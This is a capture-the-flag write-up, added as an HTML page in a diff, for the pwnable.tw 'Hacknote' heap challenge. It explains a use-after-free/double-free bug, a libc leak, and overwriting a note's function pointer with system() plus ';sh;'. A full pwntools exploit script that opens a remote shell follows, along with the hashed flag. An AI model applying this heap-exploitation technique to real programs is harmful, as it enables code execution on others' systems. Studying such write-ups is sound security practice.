@@ -1,0 +1,127 @@
+<!--Solve date: 07/07/2022-->
+
+<h1>pwnable.tw - Hacknote</h1>
+
+<h2>200 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Overview</h5>
+
+<p>This is a classic glibc heap note challenge. We have three actions: (1) create a note, (2) delete a note, and (3) print a note. Creating a note consists of <code>malloc()</code>ing a chunk for a note header and a separate chunk for the note contents, and filling those chunks. The note header contains 2 dwords - the first is a pointer to a function that prints the contents, and the second is the address of the content chunk. Deleting a note first <code>free()</code>s the note content chunk, then <code>free()</code>s the note header.</p>
+
+<img class = "small" src = "./images/pwnable_hacknote_1.png"/>
+
+<p>The bug is easy to spot: as shown above, the heap pointers in the program memory are not cleared after they are passed to <code>free()</code>. This opens up two security holes: (1) use after free and (2) double free. Use after free is not particularly useful here, since the print function pointer is overwritten upon free so we can't view the contents of freed chunks as-is. However, double free is particularly dangerous and allows us to overwrite the function pointer and get a shell. An additional detail is that chunks are not cleared prior to use, allowing for previous chunk contents to be revealed.</p>
+
+<p>The tricky part of this challenge is that only <code>5</code> notes may be created in total, including those that are deleted. This is enforced on the one hand by a global counter variable. By itself, the counter would not be a problem if we can get arbitrary write; however, there is an additional protection, which is that when a new note is requested, only the first <code>5</code> entiries of the array containing the note addresses are checked for a <code>NULL</code> spot. Recalling that the application does not clear pointers after <code>free()</code>s, this poses a strict limitation that we can only add at most <code>5</code> notes total.</p>
+
+<img src = "./images/pwnable_hacknote_2.png"/>
+
+<h5>Leaking libc with Uninitialized Reallocated Chunk</h5>
+
+<p>The fact that chunks are not cleared when they are allocated allows for memory leaks. In particular, freeing a note content chunk that is too large for a fastbin (e.g. data size of <code>92</code> corresponding to a chunk size of <code>0x60 = 96</code>) and then reallocating it will give a pointer within the main arena of libc. Note that for this to work, the chunk must not be bordering the top chunk; otherwise, it will be merged with it. Merging with the top chunk can be prevented by allocating additional chunks after the non-fastbins chunk.</p>
+
+<h5>Double Free</h5>
+
+<p>Several targets are conceivable here. First is of course <code>__free_hook</code> which is called when any chunk is freed. This requires tricking the allocator to give us a chunk at the hook address. After some consideration, it is evident that this is not possible to accomplish with the 2 notes that we have remaining.</p>
+
+<p>Indeed, the application is suspicious in that it makes use of a special function pointer to print the contents of notes. Overwriting this pointer essentially gives us the ability to redirect code execution. The first and only argument passed to this function is the address of the note header itself, as shown below.</p>
+
+<img class = "small" src = "./images/pwnable_hacknote_3.png"/>
+
+<p>If it were the second entry in the header - i.e., the address of the content chunk data - exploit would be trivial, as we can simply overwrite that entry with the address of <code>/bin/sh</code> within libc. However, it is still possible to get a shell by placing a command <i>directly within the header</i>. The first 4 bytes, containing the address of <code>system()</code> will of course be gibberish, but consider writing a semicolon (to terminate the gibberish) followed by a shell command afterwards. The tricky thing is that we only have <code>8</code> bytes with which to work; a semicolon takes up one byte, and <code>/bin/sh</code> takes up an additional <code>7</code>. The byte immediately following is the size field of the next adjacent chunk, which cannot be a proper termination to the command. However, remember that <code>sh</code> is a pseudonym for <code>/bin/sh</code> on many Linux machines, so something like <code>;sh;</code> will suffice.</p>
+
+<p>The remaining question is how to overwrite a note header. Consider deleting a note with content chunk size <code>12</code> (chunk size <code>0x10 = 16</code>) twice. This will pass the glibc checks because no chunk is freed twice in a row; rather, two chunks - the note header and the note contents - are freed alternately. After this operation, the fastbin containing <code>0x10</code>-sized chunks will appear as follows:</p>
+
+<p><code>fastbin[0x10] -> 1.head -> 1.data -> 1.head -> 1.data -> ...</code></p>
+
+<p>The chain of pointers continues forever, as the two chunks point to each other.</p>
+
+<p>Consider now creating a note with content chunk size that is something other than <code>0x10</code> - say, <code>0x18 = 24</code> - which can be done by asking for a data size of <code>20</code>. This will still take a chunk out of the <code>0x10</code>-fastbin - namely, <code>1.head</code> - to serve as the note header, but the content chunk will come from elsewhere. This means the fastbin will now look like</p>
+
+<p><code>fastbin[0x10] -> 1.data -> 1.head -> 0x0804862b -> 0x83e58955 -> ???</code></p>
+
+<p>Note that the list after <code>1.head</code> is now corrupted since the handler address was written to the first dword of that chunk. However, this will not be of particular concern for us.</p>
+
+<p>If we now request a note with content size <code>12</code> (chunk size <code>0x10 = 16</code>), the header will be allocated at <code>1.data</code>, but the content will be allocated at <code>1.head</code>, which is the header for the note created just before this! We can now write the address of <code>system()</code> along with <code>;sh;</code> to this header chunk, request to show the prior chunk, and get a shell.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+#p = process("./hacknote")
+'''
+gdb.attach(p, gdbscript = """
+    b *0x08048a96
+""")
+'''
+p = remote("chall.pwnable.tw", 10102)
+libc = ELF("./hacknote_libc.so")
+
+rec = lambda: p.recv()
+recl = lambda: p.recvline()
+recu = lambda x: p.recvuntil(x)
+send = lambda x: p.send(x)
+sendl = lambda x: p.sendline(x)
+sendnuml = lambda x: sendl(bytes(str(x), "utf-8"))
+inter = lambda: p.interactive()
+
+recu1 = lambda: recu(b':')
+def menu(choice):
+    recu1()
+    sendnuml(choice)
+    return
+    
+def add(size, contents):
+    menu(1)
+    recu1()
+    sendnuml(size)
+    recu1()
+    send(contents)
+    return
+    
+def delete(idx):
+    menu(2)
+    recu1()
+    sendnuml(idx)
+    return
+    
+def show(idx, waitline = True):
+    menu(3)
+    recu1()
+    sendnuml(idx)
+    if waitline:
+        return recl()[: -1]		#strip the newline
+        
+    return
+    
+trigBP = lambda: menu(5)
+
+# get libc address by freeing and reallocatnig from unsorted
+small0x20_ = 0x1b0808
+add(92, b'0')			#0
+add(12, b'1')			#1, prevent merge with top
+delete(0)
+add(12, b'2')			#2, leak source
+libc.address = u32(show(2)[4: 8]) - small0x20_
+log.info("Libc: 0x%x" % (libc.address))
+
+# double free
+delete(1)				#fast0x16 -> 1head -> 1data
+delete(1)				#fast0x16 -> 1head -> 1data -> 1head -> 1data -> ...
+add(20, b'3')			#3, with head at 1head | fast0x16 -> 1data -> 1head -> XXXX
+add(12, p32(libc.sym["system"]) + b";sh;")
+
+#trigBP()
+show(3, waitline = False)
+inter()
+</pre>
+
+<h4>Flag (SHA-256)</h4>
+
+<p><code>bced872d5c58da5db613eb9eae97511a0467027436d428ade0346655b38b0ea9</code></p>
